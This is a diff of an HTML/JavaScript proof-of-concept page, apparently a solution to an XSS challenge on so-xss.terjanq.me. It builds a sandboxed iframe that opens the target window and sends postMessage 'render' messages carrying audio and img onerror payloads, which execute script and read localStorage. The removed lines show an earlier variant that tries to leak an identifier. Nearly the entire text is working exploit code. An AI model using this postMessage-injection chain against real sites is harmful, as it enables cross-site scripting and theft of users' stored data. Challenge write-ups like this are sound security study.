@@ -1,23 +1,23 @@
-<script>
-  f = document.createElement('iframe');
-  f.sandbox = 'allow-scripts allow-popups';
-  f.srcdoc = `
+<body>
   <script>
-    document.onmousedown = e => {
-      let w = open('https://so-xss.terjanq.me/iframe.php');
-      setTimeout(_ => {
-        w.postMessage({type: "render", body: "<img onerror=''>"}, '*'),
-      }, 3000);
-    };
+    f = document.createElement('iframe');
+    f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
+    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
+      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
+    },1000);`.replaceAll('\n',' ');
+    f.srcdoc = `
+    <h1>Click me!</h1>
+    <script>
+      document.onmousedown = e => {
+        let w = open('https://so-xss.terjanq.me/iframe.php');
+        onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
+        setTimeout(_ => {
+          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
+        }, 1000);
+      };
+    <\/script>
+    `
+    document.body.appendChild(f);
   </script>
-  `
-  document.body.appendChild(f);
+</body>
 
-  document.onmousedown = e => {
-      let w = open('https://so-xss.terjanq.me');
-      setTimeout(_ => {
-        w[0].postMessage({identifier: LeakedValue, type: "render", body: "<img onerror=''>"}, '*'),
-      }, 3000);
-  };
-
-</script>
